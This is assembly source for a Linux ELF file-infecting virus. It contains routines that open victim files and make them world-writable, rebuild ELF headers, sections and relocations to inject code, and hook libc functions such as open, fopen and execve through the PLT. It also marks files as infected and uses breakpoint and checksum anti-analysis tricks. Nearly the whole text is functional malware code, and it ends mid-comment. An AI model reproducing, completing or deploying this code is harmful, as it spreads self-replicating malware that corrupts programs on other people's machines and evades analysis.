;-[goat_checktextcrc]---------------------------------------------------------
; check for same crc32 of .text section - 3 in a row.
ADD_FUNCTION
goat_checktextcrc32:
		BEGIN_EBLOCK_OPCODE
		call	_pusha
		mov	ecx,[g_text_index]
		jrcxz	.exit
		INT3_CALL get_section_by_index
		mov	rcx,[rbx+Elf64_Shdr.sh_size]
		jrcxz	.exit
		xor	edx,edx
		mov	rsi,[r15+MALLOC_HANDLE.addr]
		INT3_CALL CRC32
		lea	rsi,[g_last_text_CRC32]
		cmp	edx,[rsi]
		jne	.new_crc
		inc	dword [(rsi-g_last_text_CRC32)+g_last_text_CRC32_count]
		cmp	dword [(rsi-g_last_text_CRC32)+g_last_text_CRC32_count],2
		jae	_terminate
		jmp	.exit
	.new_crc:
		mov	[rsi],edx
		and	dword [(rsi-g_last_text_CRC32)+g_last_text_CRC32_count],0
	.exit:	call	_popa
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		ret
%endif ; RETAL_GOAT_CHECK

;-[calc_checksum]-------------------------------------------------------------
; calc CRC32 = DT_CHECKSUM
%if RETAL_DT_CHECKSUM == RETAL_ENABLED
ADD_FUNCTION
calc_checksum:	BEGIN_EBLOCK_OPCODE
		call	_pusha
		mov	rsi,[g_checksum_ptr]
		test	rsi,rsi
		jz	.exit
		mov	rdi,[g_prelinked_ptr]
		test	rdi,rdi
		jz	.no_prelinked1
			xor	rax,rax
			xchg	[rdi],rax
	.no_prelinked1:
		and	qword [rsi],0
		multipush rax,rsi,rdi
		xor	rcx,rcx
		push	rcx
		pop	rdx
	.checksum_loop:	call	get_section_by_index
			push	rcx
			test	qword [rbx+Elf64_Shdr.sh_flags],SHF_ALLOC|SHF_WRITE|SHF_EXECINSTR
			jz	.no_checksum
			cmp	word [rbx+Elf64_Shdr.sh_type],SHT_NOBITS
			je	.no_checksum
			mov	rcx,[rbx+Elf64_Shdr.sh_size]
			jrcxz	.no_checksum
			mov	rsi,[r15+MALLOC_HANDLE.addr]
			call	CRC32
	.no_checksum:	pop	rcx
			inc	ecx
			cmp	cx,[g_Elf64_Ehdr+Elf64_Ehdr.e_shnum]
			jb	.checksum_loop
		multipop rax,rsi,rdi
		test	rdi,rdi
		jz	.no_prelinked2
			mov	[rdi],rax
	.no_prelinked2:
		mov	[rsi],rdx
		mov	ecx,[g_dynamic_index]
		call	update_section
	.exit:	call	_popa

		END_EBLOCK_OPCODE
		ret
%endif
;-[get_section_reloc_index]---------------------------------------------------
; get relocation section index of section index in rax into rcx. return zf if none.
ADD_FUNCTION
get_section_reloc_index:
		BEGIN_EBLOCK_OPCODE
		lea	rcx,[g_section_reloc_list]
		mov	ecx,[rcx+(rax*4)]

		test	ecx,ecx
		END_EBLOCK_OPCODE
		ret

;-[get_section_by_index]------------------------------------------------------
; Gets ptr's to section rcx.
; Returns rbx = *shdr[rcx], r15 = MALLOC_HANDLE section image[rcx].
; Terminates infection on error.
ADD_FUNCTION
get_section_by_index:
		VIRUS_DEBUG_STRING +get_section_by_index
		BEGIN_EBLOCK_OPCODE
		push	rcx
		movzx	rbx,word [g_Elf64_Ehdr+Elf64_Ehdr.e_shnum]
		cmp	ecx,ebx
		jae	_terminate_infection
		imul	rbx,rcx,Elf64_Shdr_size
		add	rbx,[g_shdrs_handle+MALLOC_HANDLE.addr]
		lea	r15,[g_SectionImages_Handle]
		imul	rcx,rcx,MALLOC_HANDLE_size
		add	r15,rcx
		pop	rcx
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		ret

;-[add_to_section]------------------------------------------------------------
; add rax bytes to section rcx from buffer rsi
; return rax = offset in section of new data
ADD_FUNCTION
add_to_section:	VIRUS_DEBUG_STRING +add_to_section
		BEGIN_EBLOCK_OPCODE
		multipush rbx,rcx,rdx,rsi,rdi,r15
		push	rax
		INT3_CALL get_section_by_index
		mov	rax,[rbx+Elf64_Shdr.sh_size]
		pop	rcx
		jrcxz	.exit
		cmp	dword [rbx+Elf64_Shdr.sh_type],SHT_NOBITS
		je	.nb
		lea	rdi,[rax+rcx]
		cmp	[r15+MALLOC_HANDLE.size],edi
		jbe	_terminate_infection
		push	rax
		pop	rdi
		push	rcx
		add	rdi,[r15+MALLOC_HANDLE.addr]
		rep	movsb
		pop	rcx
	.nb:	add	[rbx+Elf64_Shdr.sh_size],rcx
	.exit:	multipop rbx,rcx,rdx,rsi,rdi,r15
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		VIRUS_DEBUG_STRING -add_to_section
		ret

;-[add_symbol]----------------------------------------------------------------
%if 0
; add symbol g_new_symbol to symbol table
; g_new_symbol st_shndx, st_value, st_size must be set.
; return eax = symbol number
ADD_FUNCTION
add_symbol:	multipush rbx,rcx,rdx,rsi,rdi,rbx
		lea	rbp,[g_new_symbol]
		xor	rax,rax
		mov	[rbp+Elf64_Sym.st_name],eax
		mov	byte [rbp+Elf64_Sym.st_info],(STB_LOCAL << 4) | STT_OBJECT
		;mov	[rbp+Elf64_Sym.st_size],rax
		push	rbp
		mov	ecx,[g_dynsym_index]
		push	rcx
		call	get_section_by_index
		mov	rax,[rbx+Elf64_Shdr.sh_size]
		xor	rdx,rdx
		mov	edi,Elf64_Sym_size
		div	rdi
		sub	[rbx+Elf64_Shdr.sh_size],rdx
		pop	rcx
		pop	rsi
		push	rax
		push	rdi
		pop	rax
		call	add_to_section
		pop	rax
	.exit:	multipop rbx,rcx,rdx,rsi,rdi,rbx
		ret
%endif
;-[add_reloc]-----------------------------------------------------------------
; add reloc(a) g_new_reloc to .rel(a).text of section symbol r10 + offset r12 at offset r11 of .text
ADD_FUNCTION
add_reloc:	VIRUS_DEBUG_STRING +add_reloc
		BEGIN_EBLOCK_OPCODE
		call	_pusha
		mov	ecx,[g_text_index]
		INT3_CALL get_section_by_index
		lea	rcx,[r11-8]
		cmp	rcx,[rbx+Elf64_Shdr.sh_size]
		ja	_terminate_infection
		mov	rdx,[r15+MALLOC_HANDLE.addr]
		and	qword [r11+rdx],0	;r12
		lea	rbp,[g_new_rel]
		push	rbp
		mov	[rbp+Elf64_Rela.r_addend],r12
		mov	[rbp+Elf64_Rela.r_offset],r11
		shl	r10,32
		;or	r10,R_X86_64_64
		inc	r10
		mov	[rbp+Elf64_Rela.r_info],r10
		mov	eax,[g_text_index]
		INT3_CALL get_section_reloc_index
		push	rcx
		INT3_CALL get_section_by_index
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		mov	rax,[rbx+Elf64_Shdr.sh_size]
		xor	rdx,rdx
		push	Elf64_Rela_size
		pop	rdi
		;cmp	dword [rbx+Elf64_Shdr.sh_type],SHT_RELA
		;je	.notrela
		;mov	edi,Elf64_Rel_size
	.notrela:
		push	rdi
		div	rdi
		sub	[rbx+Elf64_Shdr.sh_size],rdx
		pop	rax
		pop	rcx
		pop	rsi
		INT3_CALL add_to_section
		call	_popa
		END_EBLOCK_OPCODE
		VIRUS_DEBUG_STRING +add_reloc
		ret

;-[mark_infection]------------------------------------------------------------
; modify Elf64_Ehdr dword:EI_PAD to mark as infected.
ADD_FUNCTION
mark_infection:	BEGIN_EBLOCK_OPCODE

		multipush rsi,rax
		call	.skip
			db	'[jp]'		; 0
			db	'[JP]'		; 1
			db	'JKP!'		; 2
			db	'NOP!'		; 3
			db	'IR/G'		; 4
			dd	'7DFB'		; 5
			dd	'Sep!'		; 6
			dd	'TSM!'		; 7
	.skip:	pop	rsi
		INT3_CALL rand_any
		and	rax,(7 << 2)
		mov	eax,[rsi+rax]
		mov	[g_Elf64_Ehdr+EI_PAD],eax
		multipop rsi,rax
		END_EBLOCK_OPCODE
		ret

;-[update_Elf64_Ehdr]---------------------------------------------------------
; rewrite/update Elf64_Ehdr for fd_out.
ADD_FUNCTION
update_Elf64_Ehdr:
		BEGIN_EBLOCK_OPCODE
		call	_pusha
		lea	rsi,[g_Elf64_Ehdr]	; buf
		mov	edx,Elf64_Ehdr_size	; size
		xor	r10,r10			; offset
		END_EBLOCK_OPCODE
	.pwrite:BEGIN_EBLOCK_OPCODE
		test	edx,edx
		jz	.exit
		test	rsi,rsi
		jz	_terminate_infection
		mov	rdi,[g_fd_out]		; fd
		bp_syscall_al 18		; pwrite64
		jb	_terminate_infection
		cmp	rax,rdx
		jne	_terminate_infection
	.exit:	call	_popa

		END_EBLOCK_OPCODE
		ret

;-[update_phdrs]--------------------------------------------------------------
; update/rewrite phdrs in for fd_out.
ADD_FUNCTION
update_phdrs:	BEGIN_EBLOCK_OPCODE
		call	_pusha
		mov	rsi,[g_phdrs_handle+MALLOC_HANDLE.addr]
		mov	edx,[g_phdrs_size]
		cmp	[g_phdrs_handle+MALLOC_HANDLE.size],edx
		jb	_terminate_infection
		mov	r10,[g_Elf64_Ehdr+Elf64_Ehdr.e_phoff]
		END_EBLOCK_OPCODE
	.pwrite:jmp	update_Elf64_Ehdr.pwrite

;-[update_section]------------------------------------------------------------
; update/overwrite section[rcx] in fd_out.
ADD_FUNCTION
update_section:	BEGIN_EBLOCK_OPCODE

		call	_pusha
		INT3_CALL get_section_by_index
		mov	edx,[rbx+Elf64_Shdr.sh_size]
		cmp	[r15+MALLOC_HANDLE.size],edx
		jb	_terminate_infection
		mov	rsi,[r15+MALLOC_HANDLE.addr]
		mov	r10,[rbx+Elf64_Shdr.sh_offset]
		END_EBLOCK_OPCODE
	.pwrite:jmp	update_phdrs.pwrite

;-[update_shdrs]--------------------------------------------------------------
; update/rewrite shdrs in for fd_out.
ADD_FUNCTION
update_shdrs:	BEGIN_EBLOCK_OPCODE
		call	_pusha
		mov	rsi,[g_shdrs_handle+MALLOC_HANDLE.addr]
		mov	edx,[g_shdrs_size]
		cmp	[g_shdrs_handle+MALLOC_HANDLE.size],edx
		jb	_terminate_infection
		mov	r10,[g_Elf64_Ehdr+Elf64_Ehdr.e_shoff]
		END_EBLOCK_OPCODE
		jmp	update_section.pwrite


;-[rebuild_Elf64]-------------------------------------------------------------
; Rebuild Elf64 Executable/Linkable.
ADD_FUNCTION
rebuild_Elf64:	BEGIN_EBLOCK_OPCODE
		call	_pusha
		INT3_CALL update_Elf64_Ehdr
		INT3_CALL zf_if_ofile
		je	.no_phdrs
		INT3_CALL update_phdrs
	.no_phdrs:
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		xor	eax,eax
		lea	rdi,[g_shdr_index_list]
	.fill:	stosd
		inc	eax
		cmp	ax,[g_Elf64_Ehdr+Elf64_Ehdr.e_shnum]
		jb	.fill
		;
		; Sort section indexes by physical file order.
		;
		mov	rbp,[g_shdrs_handle+MALLOC_HANDLE.addr]
		lea	r8,[g_shdr_index_list]
		; for (j = 0; j < n-1; j++)
		xor	ebx,ebx
		.f1lup:
			movzx	rcx,word [g_Elf64_Ehdr+Elf64_Ehdr.e_shnum]
			dec	ecx
			cmp	ebx,ecx
			jnb	.f1done
			; iMin = j;
			push	rbx
			pop	rdx
			; for (i = j+1; i < n; i++)
			push	rbx
			pop	rax
			inc	eax
			.f2lup:	cmp	ax,[g_Elf64_Ehdr+Elf64_Ehdr.e_shnum]
				jnb	.f2done
				mov	esi,[r8+(rax*4)]	; a[i]
				mov	edi,[r8+(rdx*4)]	; a[iMin]
				;imul	rsi,rsi,Elf64_Shdr_size
				;imul	rdi,rdi,Elf64_Shdr_size
				shl	rsi,6
				shl	rdi,6
				mov	rsi,[rbp+rsi+Elf64_Shdr.sh_offset]
				mov	rdi,[rbp+rdi+Elf64_Shdr.sh_offset]
				cmp	rsi,rdi
				jnb	.l1
					push	rax
					pop	rdx
			.l1:
			inc	rax
			jmp	.f2lup
		.f2done:
			push	rax
			mov	eax,[r8+(rdx*4)]
			xchg	eax,[r8+(rbx*4)]
			mov	[r8+(rdx*4)],eax
			pop	rax
	.nswp:	inc	rbx
		jmp	.f1lup
	.f1done:END_EBLOCK_OPCODE
		;
		; Write sections one at a time.
		;
		BEGIN_EBLOCK_OPCODE
		xor	rdi,rdi
	.o_swritelup:	mov	ecx,[r8+(rdi*4)]
			INT3_CALL get_section_by_index
			cmp	qword [rbx+Elf64_Shdr.sh_offset],0
			je	.o_nw
			cmp	dword [rbx+Elf64_Shdr.sh_type],SHT_NOBITS
			je	.o_nw
			INT3_CALL zf_if_ofile ; alignment for .o files only
			jne	.no_align
			mov	r15,[rbx+Elf64_Shdr.sh_addralign]
			INT3_CALL seek_align
			mov	[rbx+Elf64_Shdr.sh_offset],rax
		.no_align:
			INT3_CALL update_section
		.o_nw:	inc	rdi
			cmp	di,[g_Elf64_Ehdr+Elf64_Ehdr.e_shnum]
			jb	.o_swritelup
		END_EBLOCK_OPCODE
		; Write ehdr,shdr's
	.do_shdrs:
		BEGIN_EBLOCK_OPCODE
		push	16
		pop	r15
		INT3_CALL seek_align
		mov	[g_Elf64_Ehdr+Elf64_Ehdr.e_shoff],rax
		INT3_CALL update_shdrs
		INT3_CALL mark_infection
		INT3_CALL update_Elf64_Ehdr
		call	_popa

		END_EBLOCK_OPCODE
		ret

;-[do_exe_phdrs]--------------------------------------------------------------
; process phdrs for exe infection.
ADD_FUNCTION
do_exe_phdrs:	VIRUS_DEBUG_STRING +do_exe_phdrs
		BEGIN_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		call	_pusha
		movzx	rcx,word [g_Elf64_Ehdr+Elf64_Ehdr.e_phnum]
		mov	rdx,[g_phdrs_handle+MALLOC_HANDLE.addr]
		xor	rbp,rbp				; max virtual addr
		push	rbp
		push	rbp
		pop	rbx				; target phdr to patch
		pop	rdi				; phdr alignment
	.phdr_loop:	mov	rsi,[rdx+Elf64_Phdr.p_offset]
			add	rsi,[rdx+Elf64_Phdr.p_filesz]
			jb	_terminate_infection
			cmp	rsi,[g_statbuf+stat.st_size]
			ja	_terminate_infection
			cmp	dword [rdx+Elf64_Phdr.p_type],PT_NOTE
			cmove	rbx,rdx
			mov	rax,[rdx+Elf64_Phdr.p_vaddr]
			add	rax,[rdx+Elf64_Phdr.p_memsz]
			cmp	rbp,rax
			cmovb	rbp,rax
			cmp	dword [rdx+Elf64_Phdr.p_type],PT_LOAD
			jne	.phdr_not_load
				mov	rax,[rdx+Elf64_Phdr.p_align]
				cmp	rdi,rax
				cmovb	rdi,rax
		.phdr_not_load:
			add	rdx,Elf64_Phdr_size
			loop	.phdr_loop
		test	rbx,rbx
	.tiz:	jz	_terminate_infection
		test	rbp,rbp
		jz	.tiz
		test	rdi,rdi
		jz	.tiz
		mov	[g_target_phdr],rbx
		mov	[g_max_phdr_vaddr],rbp
		mov	[g_phdr_align],rdi
		call	_popa
		END_EBLOCK_OPCODE
		ret

;-[get_o_symbols]-------------------------------------------------------------
; parse symbols on .o infection to resolve section symbols
ADD_FUNCTION
get_o_symbols:	VIRUS_DEBUG_STRING +get_o_symbols
		BEGIN_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		call	_pusha
		mov	ecx,[g_dynsym_index]
		INT3_CALL get_section_by_index
		mov	rdx,[r15+MALLOC_HANDLE.addr]
		mov	rdi,[rbx+Elf64_Shdr.sh_size]
		lea	rdi,[rdi+rdx-Elf64_Sym_size+1]
		xor	rcx,rcx
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		multipush rcx,rdx,rdi
	.symloop:	mov	al,[rdx+Elf64_Sym.st_info]
			and	al,0x0F
			cmp	al,STT_SECTION
			jne	.nextsym
			movzx	eax,word [rdx+Elf64_Sym.st_shndx]
			cmp	eax,[g_text_index]
			jne	.not_text
			mov	[g_text_symboln],ecx
		.not_text:
			cmp	eax,[g_data_index]
			jne	.not_data
			mov	[g_data_symboln],ecx
		.not_data:
			cmp	eax,[g_o_bss_index]
			jne	.nextsym
			mov	[g_o_bss_symboln],ecx
		.nextsym:
			inc	rcx
			add	rdx,Elf64_Sym_size
			cmp	rdx,rdi
			jb	.symloop
		multipop rcx,rdx,rdi
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		lea	rsi,[g_func_sym_list]
		push	rsi
		xor	ebx,ebx
	.func_loop:	mov	al,[rdx+Elf64_Sym.st_info]
			cmp	al,(STB_GLOBAL << 4)|STT_FUNC
			jne	.nextfunc
			movzx	eax,word [rdx+Elf64_Sym.st_shndx]
			cmp	eax,[g_text_index]
			jne	.nextfunc
			mov	[rsi+(rbx*8)],rdx
			inc	rbx
			cmp	ebx,MAX_FUNC_SYM_COUNT
			jae	.pick_func
		.nextfunc:
			inc	rcx
			add	rdx,Elf64_Sym_size
			cmp	rdx,rdi
			jb	.func_loop
	.pick_func:
		pop	rdx
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		mov	eax,ebx
		dec	eax
		cmp	ebx,1
		jb	_terminate_infection
		je	.no_rand
		INT3_CALL rand
	.no_rand:
		shl	rax,3
		mov	rdx,[rax+rdx]
		mov	[g_func_sym_entry],rdx
	.exit:	call	_popa
		END_EBLOCK_OPCODE
		VIRUS_DEBUG_STRING -get_o_symbols
		ret

;-[get_exe_symbols]-----------------------------------------------------------
; parse symbols on exe infection to resolve lib hook targets.
ADD_FUNCTION
get_exe_symbols:VIRUS_DEBUG_STRING +get_exe_symbols
		BEGIN_EBLOCK_OPCODE
		call	_pusha
		mov	ecx,[g_dynsym_strtab_index]
		INT3_CALL get_section_by_index
		mov	rbp,[r15+MALLOC_HANDLE.addr]
		mov	ecx,[g_dynsym_index]
		INT3_CALL get_section_by_index
		mov	rdx,[r15+MALLOC_HANDLE.addr]
		mov	rbx,[rbx+Elf64_Shdr.sh_size]
		lea	rbx,[rbx+rdx-Elf64_Sym_size+1]
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		xor	ecx,ecx
		.sym_loop:
			mov	esi,[rdx+Elf64_Sym.st_name]
			test	esi,esi
			jz	.nextsym
			add	rsi,rbp
			INT3_CALL strhash32
			call	.skip_names
				lstrhash32 __lxstat64
				dd	strhash32_val
				lstrhash32 __openat_2
				dd	strhash32_val
				lstrhash32 __xstat64
				dd	strhash32_val
				lstrhash32 __lxstat
				dd	strhash32_val
				lstrhash32 __xstat
				dd	strhash32_val
				lstrhash32 fopen
				dd	strhash32_val
				lstrhash32 fopen64
				dd	strhash32_val
				lstrhash32 open
				dd	strhash32_val
				lstrhash32 open64
				dd	strhash32_val
				lstrhash32 bfd_openr
				dd	strhash32_val
				lstrhash32 execve
				dd	strhash32_val
			%if RETAL_HOOK_SIGNAL == RETAL_ENABLED
				lstrhash32 signal
				dd	strhash32_val
				lstrhash32 sigaction
				dd	strhash32_val
			%endif
		.skip_names:
			pop	rdi
			xor	r8,r8
		.sym_name_loop:
			scasd
			je	.got_name
			inc	r8
			cmp	r8,RETAL_HOOK_COUNT
			jb	.sym_name_loop
			jmp	.nextsym
		.got_name:
			lea	rdi,[g_lxstat64_index]
			mov	[rdi+(r8*4)],ecx
		.nextsym:
			inc	ecx
			add	rdx,Elf64_Sym_size
			cmp	rdx,rbx
			jb	.sym_loop
		mov	eax,[g_plt_index]
		INT3_CALL get_section_reloc_index
		INT3_CALL get_section_by_index
		push	Elf64_Rela_size
		pop	r9
		cmp	dword [rbx+Elf64_Shdr.sh_type],SHT_RELA
		je	.notrela
		push	Elf64_Rel_size
		pop	r9
	.notrela:
		mov	rdx,[r15+MALLOC_HANDLE.addr]
		mov	rbx,[rbx+Elf64_Shdr.sh_size]
		add	rbx,rdx
		add	rbx,rcx
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		dec	rbx
	.symrelloop:	mov	rbp,[rdx+Elf64_Rela.r_offset]
			cmp	dword [rdx+Elf64_Rela.r_info],R_X86_64_JUMP_SLOT
			jne	.nextrel
			mov	eax,dword [rdx+Elf64_Rela.r_info+4]

			lea	rdi,[g_fopen_index]
			lea	rsi,[rdi+(g_fopen_target - g_fopen_index)]
			push	RETAL_HOOK_COUNT
			pop	rcx
		.sym_ndx_loop:	scasd
				je	.sym_ndx_found
				add	rsi,8
				loop	.sym_ndx_loop
			jmp	.nextrel
		.sym_ndx_found:
			mov	[rsi],rbp
		.nextrel:
			add	rdx,r9	;Elf64_Rela_size
			cmp	rdx,rbx
			jb	.symrelloop
		call	_popa
		END_EBLOCK_OPCODE
		VIRUS_DEBUG_STRING -get_exe_symbols
		ret

;-[check_exe_bss]-------------------------------------------------------------
; check for relocations in .bss
ADD_FUNCTION
check_exe_bss:	BEGIN_EBLOCK_OPCODE
		call	_pusha
		cmp	dword [g_prelink_undo_index],0
		jne	.found
		mov	ecx,[g_bss_index]
		test	ecx,ecx
		jz	.exit
		INT3_CALL get_section_by_index
		mov	rdi,[rbx+Elf64_Shdr.sh_addr]
		mov	rdx,[rbx+Elf64_Shdr.sh_size]
		add	rdx,rdi
		mov	ecx,[g_rela_dyn_index]
		test	ecx,ecx
		jz	.exit
		INT3_CALL get_section_by_index
		mov	rbp,[rbx+Elf64_Shdr.sh_size]
		mov	rsi,[r15+MALLOC_HANDLE.addr]
		test	rsi,rsi
		jz	.exit
		lea	rbp,[rsi+rbp-Elf64_Rela_size]
		.loop:	mov	rax,[rsi+Elf64_Rela.r_offset]
			cmp	rax,rdi
			jb	.next
			cmp	rax,rdx
			jbe	.found
		.next:	add	rsi,Elf64_Rela_size
			cmp	rsi,rbp
			jbe	.loop
		jmp	.exit
	.found	mov	byte [g_bss_has_relocs],1
	.exit:	call	_popa
		END_EBLOCK_OPCODE
		ret

;-[get_exe_dyn]---------------------------------------------------------------
; get ptr to d_val of DT_CHECK, DT_GNU_RELINKED
%if RETAL_DT_CHECKSUM == RETAL_ENABLED
ADD_FUNCTION
get_exe_dyn:	BEGIN_EBLOCK_OPCODE
		call	_pusha
		mov	ecx,[g_dynamic_index]
		jrcxz	.exit
		call	get_section_by_index ; rbx = hdr, r15 = MALLOC_HANDLE
		cmp	dword [rbx+Elf64_Shdr.sh_type],SHT_DYNAMIC
		jne	.exit
		mov	rcx,[rbx+Elf64_Shdr.sh_size]
		shr	rcx,4
		jz	.exit
		mov	rsi,[r15+MALLOC_HANDLE.addr]
	.dyn_loop:	lodsq
			cmp	rax,DT_CHECKSUM
			jne	.not_checksum
			mov	[g_checksum_ptr],rsi
			jmp	.dyn_loop_next
		.not_checksum:
			cmp	rax,DT_GNU_PRELINKED
			jne	.dyn_loop_next
			mov	[g_prelinked_ptr],rsi
		.dyn_loop_next:
			lodsq
			loop	.dyn_loop
	.exit:	call	_popa
		END_EBLOCK_OPCODE
		ret
%endif
;-[copy_entire]---------------------------------------------------------------
; copy entire fd_in to fd_out
copy_entire:	db	0xA8	; test al,xxx

;-[copy_over]-----------------------------------------------------------------
; copy over infected file. fd_out to fd_in
copy_over:	stc
ADD_FUNCTION
		VIRUS_DEBUG_STRING +copy_over
		BEGIN_EBLOCK_OPCODE
		multipush rax,rbx,rsi,rdi,r10,rdx,rbp
		mov	rdi,[g_fd_out]
		mov	rbp,[g_fd_in]
		jc	.nofdswap
		xchg	rbp,rdi
	.nofdswap:
		lea	r15,[g_CopyEntire_handle]
		mov	ebx,MAX_VICTIM_SIZE + VIRUS_ALLOC_SIZE
		INT3_CALL malloc
		; pread
		mov	rsi,[r15+MALLOC_HANDLE.addr]
		push	rbx
		pop	rdx
		xor	r10,r10
		bp_syscall_al 17		; pread64
		jb	.exit
		; pwrite
		push	rbp
		pop	rdi
		push	rax
		pop	rdx		; len
		bp_syscall_al 18		; pwrite64
		xor	rsi,rsi
		push	SEEK_END
		pop	rdx
		bp_syscall_al 8		; lseek
	.exit:	multipop rax,rbx,rsi,rdi,r10,rdx,rbp
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		ret
;-[malloc]--------------------------------------------------------------------
; allocate ebx bytes (page aligned) to MALLOC_HANDLE %r15, terminate to exit on failure.
; buffer is zero filled.
; return ptr in rax, updates MALLOC_HANDLE.
ADD_FUNCTION
malloc:		VIRUS_DEBUG_STRING +malloc
		; Terminate on malloc > 2gb.
		BEGIN_EBLOCK
		test	ebx,ebx
		js	_terminate
		CHECK_BREAKPOINT
		multipush rdi,rcx,rbx,rsi,rdx,r10,r8,r9
		; Check if handle already has allocated memory.
		mov	rdi,[r15+MALLOC_HANDLE.addr]
		mov	ecx,[r15+MALLOC_HANDLE.size]	; !Expects size < 2GB
		test	rdi,rdi
		jz	.handle_empty
		; Check if already allocated buffer >= requested size.
		cmp	ecx,ebx
		jae	.do_zero
		; Release buffer thats too small.
		call free
	.handle_empty:
		; Align size to PAGE_SIZE, call mmap.
		mov	ecx,ebx
		add	rcx,PAGE_SIZE-1
		and	ecx,-PAGE_SIZE
		; mmmp	(addr=NULL,length=rcx,
		;	prot=PROT_READ|PROT_WRITE|PROT_EXEC,
		;	flags=MAP_PRIVATE|MAP_ANONYMOUS, fd=-1, offset=NULL)
		xor	rdi,rdi
		push	rcx
		pop	rsi
		push	PROT_READ|PROT_WRITE|PROT_EXEC
		pop	rdx
		push	MAP_PRIVATE|MAP_ANONYMOUS
		pop	r10
		or	r8,-1
		xor	r9,r9
		_syscall_al 9	; mmap
		push	rax
		pop	rdi
		; Terminate on mmap fail.
	.tb0:	jb	_terminate
		mov	[r15+MALLOC_HANDLE.addr],rax
		mov	[r15+MALLOC_HANDLE.size],ecx
	.do_zero:
		; Zero buffer.
		push	rdi
		pop	rax
		shr	rcx,2
		call bzero
		multipop rdi,rcx,rbx,rsi,rdx,r10,r8,r9
		END_EBLOCK
		ret

;-[malloc_extra]--------------------------------------------------------------
; Same as malloc, but requested size is increased by MALLOC_EXTRA_SIZE byes.
ADD_FUNCTION
malloc_extra:	VIRUS_DEBUG_STRING +malloc_extra
		BEGIN_EBLOCK_OPCODE
		push	rbx
		add	ebx,MALLOC_EXTRA_SIZE
		jb	malloc.tb0
		INT3_CALL malloc
		pop	rbx
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		ret

;-[free]----------------------------------------------------------------------
; free memory pointed to by MALLOC_HANDLE %r15 if not 0, then 0.
ADD_FUNCTION
free: 		BEGIN_EBLOCK
		; Save Regs.
		multipush rbx,rdi,rsi
		;
		; Check if buffer/size are NULL/Zero.
		;
		xor	rbx,rbx
		mov	rdi,[r15+MALLOC_HANDLE.addr]
		cmp	rdi,rbx
		jz	.jz_zero
		mov	esi,[r15+MALLOC_HANDLE.size]	; !Expects size < 2GB
		cmp	esi,ebx
	.jz_zero:
		jz	.zero
		;
		; Free Buffer.
		;
		; munmap(addr,size)
		_syscall_al 11	; munmap
	.zero:	;
		; Clear MALLOC_HANDLE fields.
		;
		mov	[r15+MALLOC_HANDLE.addr],rbx
		mov	[r15+MALLOC_HANDLE.size],ebx
		; Restore Regs.
		multipop rbx,rdi,rsi

		END_EBLOCK
		ret

;-[open_files]----------------------------------------------------------------
; + Checks if input filename same as last call
; + Checks input filename stat (length and age in hours).
; + Creates output (tmp) filename, checks input filename length.
; + Opens output (O_CREAT), then input (O_RDONLY).
; + Terminates infection on error.
ADD_FUNCTION
open_files:	VIRUS_DEBUG_STRING +open_files
		BEGIN_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		call	_pusha
		; Check if last filename as last call
		mov	rsi,[g_inputfilename_ptr]
		push	rsi
		INT3_CALL strhash32
		cmp	[g_last_fname_hash],eax
		je	_terminate_infection
		mov	[g_last_fname_hash],eax
		;
		; Get and Inspect file stat.
		;
		pop	rdi
		INT3_CALL get_stat_age
	.tb0:	jb	_terminate_infection
		INT3_CALL zf_if_ofile
		pushf
		je	.noage
		cmp	rax,CHECK_NEW_FILE_HOURS
		jb	.tb0
	.noage:	mov	rax,[rsi+stat.st_size]
		cmp	rax,MAX_VICTIM_SIZE
		ja	_terminate_infection
		cmp	eax,MIN_VICTIM_SIZE
		jb	.tb0
		popf
		je	.no_exe_min
		cmp	eax,MIN_VICTIM_SIZE_EXE
		jb	.tb0
	.no_exe_min:
		mov	eax,[rsi+stat.st_mode]
		and	eax,S_IFMT
		cmp	eax,S_IFREG	; Regular file?
		jne	_terminate_infection
		END_EBLOCK_OPCODE
		;
		; Create tmp (output) output filename.
		; Exit if input filename too long
		;
		BEGIN_EBLOCK_OPCODE
		lea	rdi,[rsi-g_statbuf+g_outputfilename_buf]
		mov	rsi,[rsi-g_statbuf+g_inputfilename_ptr]
		push	rsi
		push	rdi
		xor	rcx,rcx
		mov	cl,MAX_PATH-8
		.fn_loop:	lodsb
				test	al,al
				stosb
				loopnz	.fn_loop
		jnz	_terminate_infection
		dec	rdi
		mov	rax,[g_tmp_ext]
		stosq
		END_EBLOCK_OPCODE
		; Attempt to create output file.
		;
		; open(outputfilename,O_RDWR|O_CREAT|O_TRUNC,S_IRUSR|S_IWUSR)
		BEGIN_EBLOCK_OPCODE
		pop	rdi
		mov	esi,O_RDWR|O_CREAT|O_TRUNC
		mov	edx,S_IRUSR|S_IWUSR
		bp_syscall_al 2		; open
	.tb2:	jb	_terminate_infection
		inc	dword [g_infection_status]
		mov	[rdi-g_outputfilename_buf+g_fd_out],rax
		;
		; Attempt to open victim (input file) read/write.
		;
		pop	rdi
		mov	esi,S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH
		bp_syscall_al 90		; chmod
		push	O_RDWR
		pop	rsi
		bp_syscall_al 2		; open
		jb	.tb2
		mov	[g_fd_in],rax
%if RETAL_POLY_DUMP_ENCRYPT == RETAL_ENABLED
		lea	rsi,[g_outputfilename_buf]
		lea	rdi,[g_enc_filename]
	.fnl:		lodsb
			test	al,al
			jz	.fnd
			stosb
			jmp	.fnl
	.fnd:	mov	eax,'.enc'
		stosd
		xor	ah,ah
		mov	al,'0'
		mov	[enc_file_num_rdi],rdi
		stosw
%endif
		call	_popa
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		VIRUS_DEBUG_STRING -open_files
		ret

;-[close_file]----------------------------------------------------------------
; Close file handle pointed to by rsi.
